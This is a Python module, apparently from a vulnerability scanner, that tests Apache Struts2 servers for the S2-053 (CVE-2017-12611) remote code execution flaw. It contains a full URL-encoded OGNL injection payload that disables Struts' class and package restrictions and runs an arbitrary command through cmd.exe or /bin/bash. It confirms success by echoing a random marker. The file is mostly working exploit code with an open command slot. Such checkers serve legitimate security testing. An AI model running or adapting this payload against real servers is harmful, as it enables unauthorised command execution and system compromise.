#!/usr/bin/env python3

import re
from app.lib.utils.request import request
from app.lib.utils.encode import urlencode
from app.lib.utils.common import get_capta

class S2_053_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-053漏洞,又名CVE-2017-12611漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.0.0 - 2.3.33 Struts 2.5 - Struts 2.5.10.1',
            'date': '2017-09-06',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        
        self.capta = get_capta()
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Content-Type': "application/x-www-form-urlencoded",
        }
        self.payload = '''%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D'{cmd}').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe'%2C'%2Fc'%2C%23cmd%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A'''
    
    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """
        try:
            self.check_payload = self.payload.format(cmd = urlencode('echo ' + self.capta))
            post_data = 'message={data}'.format(data = self.check_payload)
            check_req = request.post(self.url, headers = self.headers, data = post_data)
            check_str = re.sub('\n', '', check_req.text)
            result = re.findall('<input type="hidden" name="(.*?)" value="" id=".*?"/>', check_str)
            if self.capta in result[0]:
                return True
            else:
                return False
        except Exception as e:
            return False
        finally:
            pass
        
if  __name__ == "__main__":
    S2_053 = S2_053_BaseVerify('http://localhost:8080/s2_053_war_exploded/index.action')
    S2_053.run()





